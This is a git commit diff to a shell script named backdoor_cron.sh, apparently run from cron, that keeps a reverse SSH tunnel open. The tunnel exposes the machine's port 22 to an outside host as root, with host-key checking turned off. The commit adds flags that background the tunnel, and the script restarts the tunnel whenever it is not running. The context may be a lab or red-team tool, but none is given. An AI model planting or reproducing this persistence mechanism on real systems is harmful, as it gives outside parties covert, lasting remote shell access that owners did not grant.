c69f391595beed00e634c650d35dd34ace216516
tpanum <thomas@panum.dk>
2016-07-14 15:36:48 +0200

    Added changes to backdoor_cron

--- scripts/backdoor_cron.sh
+++ scripts/backdoor_cron.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
-COMMAND="ssh -oStrictHostKeyChecking=no -R server.panum.dk:{{@PORT}}:localhost:22 root@server.panum.dk"
+COMMAND="ssh -oStrictHostKeyChecking=no -N -f -R server.panum.dk:{{@PORT}}:localhost:22 root@server.panum.dk"
 pgrep -f -x "$COMMAND" > /dev/null 2>&1 || $COMMAND
